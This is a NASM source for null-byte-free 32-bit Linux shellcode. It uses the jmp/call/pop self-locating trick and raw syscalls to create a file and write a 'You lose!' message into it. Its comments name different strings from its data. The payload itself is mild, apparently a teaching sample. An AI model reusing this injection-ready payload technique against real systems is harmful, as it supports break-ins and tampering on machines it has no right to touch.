BITS 32

jmp short       callit

doit:   

pop             esi
xor             eax, eax
mov byte        [esi + 7], al   ; terminate /tmp/hacked.txt
mov byte        [esi + 17], al   ; terminate niels was here 
lea             ebx, [esi + 8]  ; get address
mov long        [esi + 18], ebx  ; put the address of niels--here in xxxx
mov             al, 5            ; the syscall open() = 5 
lea             ebx, [esi]       ; argument #1   
mov             cx, 1090         ; 1024 (append) + 64 (create if no exist) + 2 rw
mov             dx, 744q         ; if we need to create, these are the permissions
int             0x80             ; kernel int

mov long        ebx,eax          ; get the descriptor
mov             al, 4 
mov             ecx,[esi + 18]   ; the location of our data
mov             dx,9999           ; A trick to get 15 in dx without getting null bytes
sub             dx,9990

int             0x80             ; kernel interrupt

mov             al, 6            ; the close syscall = 6
int             0x80             ; clozzzz      

mov             al, 0x01         ; exit system call
xor             ebx, ebx         ; clean up
int             0x80             ; and bail out 


callit:
call            doit

db              'foo.txt#'
db              'You lose!#xxxx'
